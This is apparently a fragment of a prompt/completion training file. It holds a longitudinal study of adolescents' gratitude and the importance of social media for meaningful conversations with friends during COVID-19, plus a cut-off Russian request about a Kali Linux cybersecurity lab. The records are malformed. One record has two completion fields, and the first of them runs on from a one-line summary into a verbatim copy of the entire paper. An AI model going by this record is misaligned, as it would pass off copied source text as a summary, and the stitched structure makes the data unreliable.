(for a theoretical commentary, see Hamilton et al., in press). More broadly, current and future research on adolescent social media use should examine how adolescents are using social media and what socioemotional experiences precede and arise from these experiences (see Granic et al., 2020; Keles et al., 2020; Marino, 2018; Odgers & Jensen, 2020). The vast majority of previous work focuses on frequency of social media use. Results from this prior work provide important insights into the effects of frequent social media use, yet collapse a variety of different social media behaviors into a single metric of use. In the current study, we found that overall social media use functioned very differently from adolescents’ reported importance of social media for meaningful conversations with close friends. Future research should attend to the diversity and nuances of adolescents’ potential positive and negative experiences online, made possible by the affordances of social media (boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011). Notably, very little prior work has specifically examined adolescents’ motivations for using social media for meaningful conversations with friends, perhaps due to an assumption that online interactions are more superficial or transient. However, to the extent that youth are engaging in the majority of their peer interactions via social media, it is critical to understand how online engagement is supporting key socio-developmental tasks such as the development of more intimate, complex peer relationships. Given that some recent work has found that online social support may not provide the same psychological benefits as face-to-face support among young adults (e.g., Shensa et al., 2020), future research should aim to understand how features of different social media tools (e.g., private text messaging, video chatting, public posting) afforded by online communication alter adolescents’ meaningful conversations with friends. Importantly, the current results highlight possible avenues of intervention to increase adolescents’ positive emotional experiences using social media. Until recently, most social media-related interventions have focused on limiting social media use directly or reducing the negative effects of social media (e.g., Galla, Choukas-Bradley, Fiore, & Esposito, 2021; Tamplin, McLean, & Paxton, 2018; Walther, Hanewinkel, & Morgenstern, 2014). Fewer interventions have sought to increase positive experiences on social media or foster the antecedents (e.g., gratitude) of positive social media use. In a recent school-based gratitude intervention, adolescents who used a novel social media app to express gratitude for their peers showed increases in trait gratitude, positive affect, life satisfaction, and friendship satisfaction and reductions in anxiety and negative affect (Bono, Mangan, Fauteux, & Sender, 2020). Interventions that aim to enhance the positive aspects of social media use—particularly using the tools and platforms adolescents are already accessing—could broadly benefit adolescent mental health and specifically target teens who are struggling with physical or social isolation. Likewise, interventions aimed at boosting gratitude may contribute to increasing positive social media use and upward spirals of well-being. Limitations and Future Directions The current study has several strengths, including the use of a large sample of adolescents followed across a 15-month period leading up to and during the COVID-19 pandemic. However, the results from this sample may not generalize to other samples or contexts. For example, the negative effects of the COVID-19 pandemic have not been universally experienced; adolescents of color and those living in low-income contexts have been disproportionately negatively affected (Webb Hooper, Napoles, & Perez-Stable, 2020). The current sample is relatively diverse in terms of racial/ethnic identity and SES, yet each was measured with a oneitem proxy reported by the school. Complex contextual factors affecting the adolescents in this sample remain unknown, limiting our ability to examine the role of these factors in the current models and to determine the generalizability of the present results. For adolescents struggling under the burden of poverty or discrimination, communication with friends online and experiences of gratitude may have benefits, but may not be sufficient to overcome systemic barriers to sustained wellbeing. Future research is critical to understand how these complex contextual and identity factors affect the online and socioemotional experiences of diverse adolescents. Additionally, although we found no differences across participants who were learning in-person vs. virtually during COVID-19, we do not have sufficient information to understand how the present results may be directly affected by isolation from schoolbased peers. For example, even adolescents who have been attending school in-person during the pandemic may struggle with isolation if their friends are engaging in remote learning, whereas those learning remotely who are able to safely see friends in-person may be protected from loneliness despite broader isolation from peers. Future work that replicates the present findings in various contexts, including during the pandemic and in other situations of isolation, will help elucidate the unique effect of peer isolation on the present findings. The present study also relies on correlational self-report data. Self-report measures are critical for understanding the subjective reactions adolescents have to online experiences. However, adolescents’ reports of their frequency of social media use could be supplemented with passively collected phonebased data in future work, which can measure frequency of use without recall bias. Ecological momentary assessment procedures may also help capture immediate affective responses to social media experiences, providing more information about the temporal unfolding of short- and longterm effects of experiences on social media (e.g., Hamilton, Do, Choukas-Bradley, Ladouceur, & Silk, 2021). Moreover, while the current study provides information about the unfolding of adolescents’ social media experiences and gratitude across four time points, causality cannot be determined without an experimental design. CONCLUSION The current study highlights associations between adolescents’ gratitude and motivation to use social media to build social connection in the context of COVID-19. This study also highlights the value of including measures of specific social media behaviors beyond simply frequency of social media use to understand social-emotional development and sheds light on how some forms of social media use may be linked to positive emotional experiences. Furthermore, our results suggest gratitude is a predictor of positive social media use not previously studied among adolescents. Using social media to foster social connection, but not all social media use, may be associated with higher gratitude over time, and furthermore, gratitude may motivate adolescents’ meaningful social media use. While our findings are preliminary, they suggest potential avenues for interventions that aim to enhance the positive aspects of social media use, which could be especially beneficial for teens struggling with physical or social isolation.","completion":"The text discusses the association between adolescents' social media use, specifically for meaningful conversations with friends, and their levels of gratitude before and during the COVID-19 pandemic.

During the COVID-19 pandemic, some ways of using social media—such as directly communicating with friends— may have helped adolescents thrive. We examined longitudinal associations between high school adolescents’ social media use and gratitude across a 15-month period before and during the pandemic (n = 704, Mage = 15.10; 52% girls). The trajectories of gratitude and the importance of social media for meaningful conversations with friends—but not frequency of social media use—were positively associated over time. At the within-person level, gratitude predicted increased importance of social media for meaningful conversations, but not vice-versa. Findings suggest that gratitude may be associated with and may motivate using social media to foster social connection, but may not increase overall social media use. Key words: adolescence – gratitude – social media The COVID-19 pandemic has had an enormous impact on individuals’ social and psychological lives. For adolescents, the reduced in-person interaction with peers necessitated by the pandemic may pose unique challenges (Orben, Tomova, & Blakemore, 2020). To overcome the social distancing guidelines that restrict in-person interactions, many adolescents have been using social media to connect with peers during COVID-19 (Common Sense Media, 2020; Hamilton et al., in press). Despite prevailing discussions about the risks of adolescent social media use, positive engagement with peers on social media offers benefits, including opportunities to reap social support and engage in self-disclosure (Uhls, Ellison, & Subrahmanyam, 2017). Directly communicating with close friends on social media when in-person interactions are prohibited may be key to helping adolescents thrive during the isolation of COVID19 (Hamilton et al., in press; Orben et al., 2020). Gratitude, defined broadly as a general orientation toward “seeing the positive,” particularly in the context of social relationships (Wood, Froh, & Geraghty, 2010), may also help adolescents cope with the social deprivation of the pandemic. Notably, research has shown that gratitude both promotes positive social relationships and, simultaneously, is often enhanced in the context of close relationships (see Wood et al., 2010). With limited opportunities for in-person interaction, adolescents with higher trait gratitude may be more inclined to seek alternative, online routes to meaningful social interaction. Additionally, adolescents who have maintained social connection with friends on social media during the pandemic may have more opportunities to experience kindness and supportive relationships, which may in turn induce feelings of gratitude. In this study, we examine bidirectional associations between adolescents’ gratitude and motivation to use social media for meaningful communication with friends across a 15-month period leading up to and during the COVID-19 pandemic. Adolescent Peer Interactions and the COVID-19 Pandemic One of the most notable characteristics of adolescent development is the increased salience and importance of peers. Relative to children, adolescents spend more time with peers and peer relationships become more intimate and complex (Brown & Larson, 2009). Nearly all adolescents have at least one friend (Anderson & Jiang, 2018), and friendships provide adolescents with support and mutual responsiveness, as well as opportunities to build social skills like conflict management and perspective-taking (Bagwell & Bukowski, 2018). Although some challenges of the pandemic have affected only a subset of adolescents—including financial disruptions and death of loved ones— nearly all adolescents have had to contend with restrictions on peer interactions, increasing the risk for mental health problems (Loades et al., 2020; Racine et al., 2020). In numerous studies from the early months of the pandemic, adolescents reported that one of their greatest concerns about COVID-19 social distancing was about maintaining friendships remotely (e.g., Efuribe, Barre-Hemingway, Vaghefi, & Suleiman, 2020; Ellis, Dumas, & Forbes, 2020). Although evidence is still emerging, some findings suggest that the ability to stay connected to friends is protective against mental health challenges related to social distancing during the pandemic (Magson et al., 2021). Adolescents who have been able to safely continue meaningfully connecting with friends during the pandemic may have better mental health and more opportunities to experience positive emotions. Adolescent Social Media Use Social media refers to websites and applications that allow for social interaction (Hamilton et al., in press; Nesi, Choukas-Bradley, & Prinstein, 2018). To contend with limitations on in-person interactions, many adolescents have turned to social media, even more so than usual, for peer connection during the pandemic (Common Sense Media, 2020; Ellis et al., 2020; Munasinghe et al., 2020). Some parents have reported that their children’s social media use has become “excessive” (Caffo, Scandroglio, & Asta, 2020), and many have sought strategies to reduce their children’s media use given concerns about its potential negative effects (Vanderloo et al., 2020). Indeed, there is a small positive association between frequency of social media use and adolescent internalizing symptoms that has received ample research attention in recent years (Keles, McCrae, & Grealish, 2020; Sarmiento et al., 2020). However, it is necessary to disentangle frequency of use (i.e., “screen time”) from quality of use (see Granic, Morita, & Scholten, 2020; Marino, 2018; Odgers & Jensen, 2020), particularly in an era when most or all peer interactions occur on these platforms. Prior to the pandemic, adolescents reported that a primary motivation to use social media was to interact with peers and 81% said that social media helped them feel more connected to friends (Anderson & Jiang, 2018). Although theories on the affordances of social media highlight the differences between in-person and technology-mediated communication (e.g., boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011), the features of social media do not preclude positive social experiences. For example, to varying degrees, interactions on social media can be asynchronous and provide limited interpersonal social cues (Nesi et al., 2018). However, the asynchronicity and constant availability of social media allows for adolescents to communicate with their friends more frequently than in-person interactions would allow. Increasingly, social media platforms also offer a range of features, such that adolescents may have opportunities to post publicly, chat privately, or video chat with their friends, all on the same platform. Relative to the large body of work on the risks of social media use, research examining the potential positive impacts of social media use on adolescents is extremely sparse. Preliminary evidence suggests that benefits are accrued in large part through positive social connection, feelings of social belonging, and direct communication with friends (Allen, Ryan, Gray, McInerney, & Waters, 2014; Uhls et al., 2017). Specifically, when social media is used to foster close relationships, some evidence suggests that adolescents can feel positive emotions, such as higher self-esteem, well-being, and relational satisfaction (Best, Manktelow, & Taylor, 2014; Hall & Baym, 2011; Uhls et al., 2017). Given the strong associations between various positive emotions and the uniquely social component of gratitude (Wood et al., 2010), gratitude may also theoretically result from online social connection. Gratitude may also prompt adolescents to engage in positive interactions on social media, yet no prior work has examined positive emotional antecedents of different types of social media use. The Role of Gratitude In the limited prior work on adolescents’ positive use of social media, no studies have examined the role of gratitude. Although higher gratitude may both encourage and stem from meaningful peer interaction on social media, gratitude may be of particular relevance during the COVID-19 pandemic. Being thankful for close relationships and one’s life circumstances is an adaptive, natural coping response when those people and circumstances are threatened during a crisis (Fredrickson, Tugade, Waugh, & Larkin, 2003). Indeed, a sentiment analysis of public Twitter posts found that expressions of gratitude increased during the early months of the pandemic (Lwin et al., 2020). Gratitude can be defined as both an emotion and a trait. In terms of emotionality, grateful affect (e.g., feeling thankfulness after receiving aid from others) can vary in frequency and intensity across people and time (Wood et al., 2010). Gratitude as a trait is broadly conceptualized as an “orientation toward noticing and appreciating the positive in the world” (Wood et al., 2010; pg. 891), and higher trait gratitude is characterized by consistently higher levels of grateful affect (McCullough, Emmons, & Tsang, 2002). Research in the field of positive psychology indicates that positive emotions such as gratitude—not just the absence of negative emotions—are central to health, wellness, resilience, and human flourishing (see Seligman & Csikszentmihalyi, 2000). Robust evidence with adults and adolescents indicates that gratitude is associated with lower risk of psychopathology and higher well-being (Bono et al., 2019; Froh, Bono, & Emmons, 2010; Kwok, Gu, & Cheung, 2019; Wood et al., 2010; Yang, Yan, Jia, Wang, & Kong, 2020). Gratitude is also a uniquely social emotion, given that gratitude is often felt toward others and in the context of interpersonal relationships. Theoretical work highlights that gratitude plays a central evolutionary role in promoting social wellbeing and mutual responsivity in close relationships (Algoe, 2012), suggesting that gratitude may impact well-being indirectly through positive social experiences. Empirical findings also suggest a bidirectional association between gratitude and positive social connection. For example, among adults, gratitude for a romantic partner both originates from and promotes relationship maintenance behaviors (Kubacka, Finkenauer, Rusbult, & Keijsers, 2011). Among adolescents, longitudinal findings show that gratitude and positive social outcomes, including social integration and prosocial behavior, are mutually reinforcing (Bono et al., 2019; Froh et al., 2010). Although research has not examined mutually reinforcing associations between gratitude and online social connection, these prior findings likely apply to social media contexts. Gratitude is likely not sufficient to fully shield individuals from the challenges and tragedies of the COVID-19 pandemic, yet gratitude and meaningful online communication may have benefits for some adolescents. The Present Study The current study examines associations between changes in gratitude and motivations to use social media before and during the COVID-19 pandemic among U.S. high school adolescents. Although prior work has focused almost exclusively on the risks of social media use, in this study we sought to identify associations between social media use and gratitude—a positive emotional experience— particularly in a context when in-person social interaction is not possible. During the pandemic, gratitude may motivate social interaction (Jiang, 2020; Syropoulos & Markowitz, 2021), even when only online social contact is permitted. Additionally, social interaction—particularly when social deprivation is high—may spur feelings of gratitude. We sought to understand how adolescents’ motivation to use social media for direct, meaningful conversations could be related to gratitude, above and beyond the effects of frequency of social media use. We predicted that gratitude and the importance of social media for meaningful conversations with friends would be bidirectionally associated over time. METHOD Participants were 743 adolescents between the ages of 13 and 18 at baseline (Mage = 15.10, SDage = 1.01) recruited from a large, diverse suburban high school district in the U.S. state of Florida as part of a longitudinal study assessing adolescents’ character development and social media use. The vast majority (n = 724) attended a single school, ten participants attended a second school, and the remaining participants (n = 9) attended four other schools. Adolescents self-reported their gender identity at each time point. The sample included 52.2% girls and 44.5% boys; 3.1% reported another gender identity or reported different gender identities at different time points. One participant had missing data for gender identity. Data were collected and de-identified by the Character Lab Research Network (CLRN) before being shared with the research team. The CLRN is a consortium of schools and researchers working together to collect school-based data and facilitate developmental research. Students completed online surveys during regular school hours. All study procedures were approved by the university’s Institutional Review Board. Sample demographic information regarding race and socioeconomic status (SES) was obtained from school student information systems data. The sample was 53.97% Hispanic/Latinx, 26.11% White non-Hispanic/Latinx, 7.40% Black, 6.46% Asian, and 6.06% multiracial or another race/ethnicity. Nearly half of participants (43.61%) indicated that they were eligible for free or reduced-price lunch, which was used in this study as a proxy for lower SES. Participants completed an online survey at four time points: two before the pandemic (October 2019 [T1] and February 2020 [T2]), and two during the pandemic (October 2020 [T3] and January 2021 [T4]). During COVID-19, all participants at one school (n = 10) attended school fully virtually. The remaining schools were operating under a hybrid learning environment, such that some students were fully in-person and others were fully virtual. A minority of these students were engaging in inperson learning at T3 (15.21%) and T4 (27.46%); the remaining students were learning virtually. Independent samples t tests compared those who were learning virtually to those who were learning inperson at both time points during COVID-19. There were no significant differences in frequency of social media use at T3 (t = .35, p = .72) or T4 (t = .13, p = .89), no significant differences in gratitude at T3 (t = .13, p = .90) or T4 (t = .87, p = .39), and no significant differences in the importance of social media for meaningful conversations with friends at T3 (t = .60, p = .55) or T4 (t = .97, p = .33). Measures Frequency of social media use. A single item was developed for the current study to assess time spent using social media. At each time point, the survey packet indicated to participants that “Social media refers to any apps or websites that involve social interaction, such as Instagram, Snapchat, or Facebook.” Participants reported, on average, how many hours they spent on social media per day. Response options ranged from 0 = less than one hour to 10 = 10 hours or more. Similar single-item measures of frequency of social media use are commonly used among adolescent samples (e.g., Ellis et al., 2020). Importance of social media for meaningful conversations. Using a survey instrument developed by Common Sense Media (2020), participants responded to the item, “How important is social media to you for having meaningful conversations with your close friends?” Responses ranged from 1 = Not important at all to 5 = Extremely important. Gratitude. To assess adolescents’ trait gratitude, participants completed the Gratitude Questionnaire-Six Item Form at each time point (GQ-6; McCullough et al., 2002). The scale assesses the level of gratitude participants experience in their daily lives. Example items include “I have so much in life to be thankful for,” “I am grateful to a wide variety of people,” and “As I get older, I find myself more able to appreciate the people, events, and situations that have been a part of my life history.” Response options range from 1 = Strongly disagree to 7 = Strongly agree. A mean score is calculated across items, with higher scores indicating greater gratitude. The GQ-6 can be reliably used with adolescent samples (Froh et al., 2011) and showed good reliability in the current study (T1 a = .80, T2 a = .79, T3 a = .77, T4 a = .79). Analysis Plan Descriptive statistics, including means, standard deviations, and bivariate correlations among all study variables, were first examined using R version 3.6.1. The remainder of analyses were conducted within a structural equation modeling framework in MPlus 8.5 (Muthen & Muthen, 1998– 2017). Any participants who had data for any study variables of interest (i.e., gratitude, importance of social media for meaningful conversations, and frequency of social media use) at Time 3 or Time 4 (i.e., during the COVID-19 pandemic) were included in analyses. Full information maximum likelihood with robust standard errors (MLR) was used for estimation and to handle missing data. When comparing fit between two nested models, chi-square difference tests using an MLR correction (Sartorra & Bentler, 2010) were used to determine relative model fit. For the latent growth curve model, covariates included gender (i.e., boy, other gender; girl as reference group), race/ethnicity (i.e., White, Black, Asian, other race/ethnicity; Hispanic/Latinx as reference group), SES (i.e., dummy code for free/reduced-price lunch), and school (i.e., a dummy code for the largest school). First, a multivariate latent growth curve model with four time points was constructed to examine trajectories and relations among variables of interest. Time was coded in models so as to account for unequal intervals between time points (i.e., factor loadings set to 1.2, .8, 0, and .3). The intercept for all variables was set to Time 3, the first time point during the COVID-19 pandemic. Unconditional univariate latent growth models were first conducted to determine the optimal functional form of each variable and to examine the time-specific residual structure. A multivariate model was then constructed, controlling for demographic covariates, with each of the three primary variables examined in parallel, modeling covariances among latent growth factors. Next, a random-intercept cross-lagged panel model was constructed to examine the direction of effects in within-person associations between variables. The model simultaneously included all three variables with autoregressive and crosslagged paths estimated between time points and within-time covariances among the variables. Separate models were tested with constraints setting equal the cross-lagged paths, the autoregressive paths, and their combination. These models were compared to a baseline model with no constraints. We retained the most parsimonious model that did not worsen fit compared to the baseline model. RESULTS Descriptive statistics for all study variables and bivariate correlations are presented in Table 1. Univariate Latent Growth Models Unconditional univariate latent growth models were first constructed for each variable. Interceptonly models were first conducted for each, followed by models with both latent intercept and slope factors, and finally, latent intercept, slope, and quadratic factors. Equality constraints on time-specific residuals were then compared against a heteroscedastic residual structure. For gratitude, a linear model with heteroscedastic residuals was the best-fitting and most parsimonious, with excellent fit, v2 (5) = 6.48, p = .262, RMSEA = .02, SRMR = .05, CFI = 1.00, TLI = .99. For frequency of social media use, a linear model with homoscedastic residuals was determined to be the optimal model form, with excellent fit, v2 (8) = 12.18, p = .143, RMSEA = .03, SRMR = .04, CFI = 0.99, TLI = .99. For importance of social media for meaningful conversations, a linear model with homoscedastic residuals was also best, with excellent fit, v2 (8) = 16.71, p = .033, RMSEA = .04, SRMR = .07, CFI = 0.97, TLI = .98. Results of these models suggested a significant negative slope (b = 0.15, SE = .03, p < .001) and positive intercept (b = 4.36, SE = .03, p < .001) for gratitude. Similarly, a significant negative slope (b = 0.10, SE = .04, p = .005) and positive intercept (b = 3.63, SE = .03, p < .001) were revealed for importance of social media for meaningful conversations. The slope of frequency of social media use was positive and significant (b = 0.40, SE = .60, p < .001), and the intercept was positive (b = 4.14, SE = .07, p < .001). Variances of slopes and intercepts were significant (p < .001) for all models with the exception of the slope variance for frequency of social media use (p = .48). Multivariate Model These best-fitting univariate models were then combined into a single, multivariate model with covariances between all latent growth factors and correlations between time-specific residuals (see Figure 1). Setting correlations between time-specific residuals to be equal across time did not result in a significant decrement in model fit; thus, these constraints were retained for parsimony. The final model included time-invariant covariates of gender, race/ethnicity, SES, and school. Model fit was excellent, v2 (102) = 118.73, p = .123, RMSEA = .02, SRMR = .03, CFI = 0.99, TLI = .98. In the final model, the slope of importance of social media for meaningful conversations was significantly associated with the slope of gratitude, controlling for overall trajectories of social media use. This indicates that youth who experience steeper decreases in the importance they attribute to social media for meaningful conversations also report steeper decreases in gratitude over time. Similarly, youth who experience steeper increases in the importance of social media for meaningful conversations also report steeper increases in gratitude. However, there was no association between the slope of frequency of social media use and slope of gratitude. See Table 2 for covariances among all latent growth factors in the final, conditional multivariate model. Within-Person Cross-Lagged Associations Finally, a random-intercept cross-lagged panel model was used to examine within-person change in gratitude, time on social media, and importance of social media for meaningful conversations with friends (see Figure 2). Nested model comparisons suggested that the cross-lagged paths could be constrained to be equal, but constraining autoregressive paths resulted in a significant decrement in model fit; thus, in the final model, cross-lagged paths were constrained, whereas autoregressive paths were allowed to freely vary. The model fit the data well, v2 (33) = 45.24, p = .076, RMSEA = .02, SRMR = .04, CFI = 0.99, TLI = .98. The stable between-person part of the model (i.e., the random intercept) showed a significant negative covariance between gratitude and time on social media (b = 0.24, SE = .08, p = .003), a significant positive covariance between time on social media and importance of social media for meaningful conversations with friends (b = 0.28, SE = .08, p < .001), and a nonsignificant association between gratitude and importance of social media for conversations with friends (b = 0.07, SE = .04, p = .078). The within-person part of the model indicated a significant cross-lagged path from gratitude to importance of social media for meaningful conversations with friends. Adolescents who reported higher levels of gratitude at a given time point (compared to their average) reported higher importance of social media for meaningful conversations with friends at subsequent time points (b = 0.11, SE = .05, p = .045). The opposite direction of effects was not supported: within-person change in importance of social media for conversations with friends was not significantly associated with within-person change in gratitude at a subsequent time point (b = 0.03, SE = .04, p = .432). Within-person change in frequency of social media use was not associated with subsequent change in gratitude (b = 0.01, SE = .03, p = .852) or importance of social media for meaningful conversations with friends (b = 0.02, SE = .03, p = .435). Within-person change in frequency of social media use was also not predicted by prior change in gratitude (b = 0.01, SE = .10, p = .884) or importance of social media for meaningful conversations with friends (b = 0.12, SE = .07, p = .092). See Table 3 for the within-person autoregressive and cross-lagged DISCUSSION The current study examined U.S. adolescents’ gratitude and social media experiences across a 15- month period leading up to and during the COVID-19 pandemic. Overall, results show that gratitude and the importance adolescents attribute to using social media for meaningful conversations with friends are associated over time. Across the four time points of the study, gratitude and importance of social media for meaningful conversations with friends went down on average, but were positively associated with each other over time. In other words, those who reported greater importance of social media for having meaningful conversations over time also reported higher levels of gratitude over time. Furthermore, at the withinperson level, higher-than-average gratitude was associated with subsequent increases in the importance of social media for meaningful conversations, but not vice-versa, suggesting that within-person increases in gratitude may spur motivation to use social media to connect with friends. Across models, frequency of social media use was generally not significantly associated with gratitude, or in some cases was negatively associated. Thus, gratitude may be associated with using social media to foster social connection, but not necessarily all social media use. Benefits of Social Media Use During the COVID19 Pandemic The COVID-19 pandemic has threatened the mental health of adolescents in numerous ways, including by limiting their in-person social interactions during a developmental period when peers are of the utmost importance. Online communication, primarily through social media, may be the only way adolescents can continue relationships with friends and stay connected to a broader peer network. Prior work has shown that adolescents’ frequent social media use is associated with worse mental health (Keles et al., 2020; Sarmiento et al., 2020). However, the effects of social media use on adolescent well-being likely depend on the type of social media use in question. For example, one recent study found that more frequent social media use during the pandemic was associated with negative outcomes for some adolescents, yet frequent direct online communication with friends was associated with lower levels of loneliness (Ellis et al., 2020). In line with this prior work, the present results highlight that intraindividual change in using social media to foster or maintain close relationships with friends may co-occur with changes in gratitude and may be more important to consider than overall frequency of social media use. Directional Associations Between Gratitude and Social Media Use To our knowledge, no prior work has examined how the importance adolescents attribute to social media for having meaningful communication with friends is associated with gratitude—or any positive emotion—over time. Yet prior work has found that gratitude is associated with better individual mental health both directly and indirectly through increased positive social experiences (Wood et al., 2010). The association between gratitude and interpersonal relationships is often mutually reinforcing in an “upward spiral,” with gratitude contributing to positive social experiences and these experiences in turn enhancing gratitude (e.g., Bono et al., 2019; Fredrickson, 2004; Froh et al., 2010). The inclination toward positive social engagement for those high in gratitude is likely not limited to in-person interactions. Social media offers a unique venue for engaging in social connection and building gratitude, particularly when other forms of interpersonal connection are limited—such as during a pandemic. In the current study, at the within-person level, increases in gratitude relative to one’s average were associated with subsequent increases in the importance of social media for meaningful conversations, yet increases in the importance of social media for meaningful conversations were not directly associated with later increases in gratitude. Thus, our findings highlight that gratitude may encourage social media use aimed at fostering close peer connections, without increasing overall social media use. As such, gratitude may be a key underexplored mechanism in enhancing positive social media use. Broadly speaking, these results highlight an important and often overlooked point for an understanding of adolescent social media use: while researchers usually focus on how social media use predicts subsequent adjustment, adolescents’ sense of well-being may also drive how they engage with social media. One recent study showed that life satisfaction predicted less frequent social media use among adolescents (Orben, Dienlin, & Przybylskia, 2019), but the effect of emotional states on specific social media behaviors remains underexplored. Additionally, although adolescents’ specific uses of social media have occasionally been examined as an outcome of psychopathology (Radovic, Gmelin, Stein, & Miller, 2017), we are unaware of prior studies investigating how adolescents’ positive socioemotional states or traits predict specific forms of social media use. Beyond the COVID-19 Pandemic: Implications for Future Research and Intervention Although the present results may be specific to the context of the COVID-19 pandemic, the results likely have broad implications. For adolescents experiencing isolation—whether physical or emotional—some forms of social media use may be related to positive emotional experiences, such as gratitude (Orben et al., 2020). Additionally, adolescents who experience positive emotions such as gratitude may benefit from social media as a context for positive interpersonal experiences (e.g., connection, support), given that it is available 24/7, unlike in-person social interactions (Nesi et al., 2018). For example, adolescents who are physically isolated from their communities, such as those living in rural settings, may benefit from using social media to foster and maintain meaningful connections with their close friends (Chew, LaRose, Steinfield, & Velasquez, 2011), which may contribute to an upward spiral of positive emotions and positive social interactions. Future research should explore other potential positive emotional experiences beyond gratitude that may be associated with certain positive forms of social media use. Researchers can use findings on adolescent social media use during the era of COVID-19 as a foundation from which to understand the potential for social media to foster connection, perhaps especially among isolated adolescents (for a theoretical commentary, see Hamilton et al., in press). More broadly, current and future research on adolescent social media use should examine how adolescents are using social media and what socioemotional experiences precede and arise from these experiences (see Granic et al., 2020; Keles et al., 2020; Marino, 2018; Odgers & Jensen, 2020). The vast majority of previous work focuses on frequency of social media use. Results from this prior work provide important insights into the effects of frequent social media use, yet collapse a variety of different social media behaviors into a single metric of use. In the current study, we found that overall social media use functioned very differently from adolescents’ reported importance of social media for meaningful conversations with close friends. Future research should attend to the diversity and nuances of adolescents’ potential positive and negative experiences online, made possible by the affordances of social media (boyd, 2010; Nesi et al., 2018; Subrahmanyam & Smahel, 2011). Notably, very little prior work has specifically examined adolescents’ motivations for using social media for meaningful conversations with friends, perhaps due to an assumption that online interactions are more superficial or transient. However, to the extent that youth are engaging in the majority of their peer interactions via social media, it is critical to understand how online engagement is supporting key socio-developmental tasks such as the development of more intimate, complex peer relationships. Given that some recent work has found that online social support may not provide the same psychological benefits as face-to-face support among young adults (e.g., Shensa et al., 2020), future research should aim to understand how features of different social media tools (e.g., private text messaging, video chatting, public posting) afforded by online communication alter adolescents’ meaningful conversations with friends. Importantly, the current results highlight possible avenues of intervention to increase adolescents’ positive emotional experiences using social media. Until recently, most social media-related interventions have focused on limiting social media use directly or reducing the negative effects of social media (e.g., Galla, Choukas-Bradley, Fiore, & Esposito, 2021; Tamplin, McLean, & Paxton, 2018; Walther, Hanewinkel, & Morgenstern, 2014). Fewer interventions have sought to increase positive experiences on social media or foster the antecedents (e.g., gratitude) of positive social media use. In a recent school-based gratitude intervention, adolescents who used a novel social media app to express gratitude for their peers showed increases in trait gratitude, positive affect, life satisfaction, and friendship satisfaction and reductions in anxiety and negative affect (Bono, Mangan, Fauteux, & Sender, 2020). Interventions that aim to enhance the positive aspects of social media use—particularly using the tools and platforms adolescents are already accessing—could broadly benefit adolescent mental health and specifically target teens who are struggling with physical or social isolation. Likewise, interventions aimed at boosting gratitude may contribute to increasing positive social media use and upward spirals of well-being. Limitations and Future Directions The current study has several strengths, including the use of a large sample of adolescents followed across a 15-month period leading up to and during the COVID-19 pandemic. However, the results from this sample may not generalize to other samples or contexts. For example, the negative effects of the COVID-19 pandemic have not been universally experienced; adolescents of color and those living in low-income contexts have been disproportionately negatively affected (Webb Hooper, Napoles, & Perez-Stable, 2020). The current sample is relatively diverse in terms of racial/ethnic identity and SES, yet each was measured with a oneitem proxy reported by the school. Complex contextual factors affecting the adolescents in this sample remain unknown, limiting our ability to examine the role of these factors in the current models and to determine the generalizability of the present results. For adolescents struggling under the burden of poverty or discrimination, communication with friends online and experiences of gratitude may have benefits, but may not be sufficient to overcome systemic barriers to sustained wellbeing. Future research is critical to understand how these complex contextual and identity factors affect the online and socioemotional experiences of diverse adolescents. Additionally, although we found no differences across participants who were learning in-person vs. virtually during COVID-19, we do not have sufficient information to understand how the present results may be directly affected by isolation from schoolbased peers. For example, even adolescents who have been attending school in-person during the pandemic may struggle with isolation if their friends are engaging in remote learning, whereas those learning remotely who are able to safely see friends in-person may be protected from loneliness despite broader isolation from peers. Future work that replicates the present findings in various contexts, including during the pandemic and in other situations of isolation, will help elucidate the unique effect of peer isolation on the present findings. The present study also relies on correlational self-report data. Self-report measures are critical for understanding the subjective reactions adolescents have to online experiences. However, adolescents’ reports of their frequency of social media use could be supplemented with passively collected phonebased data in future work, which can measure frequency of use without recall bias. Ecological momentary assessment procedures may also help capture immediate affective responses to social media experiences, providing more information about the temporal unfolding of short- and longterm effects of experiences on social media (e.g., Hamilton, Do, Choukas-Bradley, Ladouceur, & Silk, 2021). Moreover, while the current study provides information about the unfolding of adolescents’ social media experiences and gratitude across four time points, causality cannot be determined without an experimental design. CONCLUSION The current study highlights associations between adolescents’ gratitude and motivation to use social media to build social connection in the context of COVID-19. This study also highlights the value of including measures of specific social media behaviors beyond simply frequency of social media use to understand social-emotional development and sheds light on how some forms of social media use may be linked to positive emotional experiences. Furthermore, our results suggest gratitude is a predictor of positive social media use not previously studied among adolescents. Using social media to foster social connection, but not all social media use, may be associated with higher gratitude over time, and furthermore, gratitude may motivate adolescents’ meaningful social media use. While our findings are preliminary, they suggest potential avenues for interventions that aim to enhance the positive aspects of social media use, which could be especially beneficial for teens struggling with physical or social isolation.","completion":"During the COVID-19 pandemic, some ways of using social media—such as directly communicating with friends— may have helped adolescents thrive. The study examined the longitudinal associations between high school adolescents' social media use and gratitude across a 15-month period before and during the pandemic. The findings suggest that gratitude may be associated with and may motivate using social media to foster social connection, but may not increase overall social media use. Adolescents who experience gratitude may be driven to use social media for meaningful conversations with friends, indicating a positive association between gratitude and the importance adolescents attribute to social media for building social connections. The COVID-19 pandemic has had a significant impact on individuals' social and psychological lives, particularly for adolescents who rely on in-person interactions with peers. The reduced in-person interaction necessitated social media use to connect with peers during COVID-19. The study highlights the importance of social media use for meaningful conversations with close friends, indicating that these interactions are positively associated with gratitude. The results suggest that gratitude may be a key factor in motivating adolescents to use social media for meaningful communication, especially when in-person interactions are restricted. Overall, the findings suggest that positive engagement with peers on social media can offer benefits such as social support and self-disclosure, which may contribute to adolescents' well-being during times of social isolation."},{"prompt":"Прочитай текст лабораторной работы, напиши краткий вывод и кратко ответь на итоговые вопросы в конце: Ознакомление с основным инструментарием кибербезопасности на примере Kali Linux Цель: понять workflow злоумышленника (сотрудника Red Team) и меры защиты (действия сотрудника Blue Team) Задачи: 1.

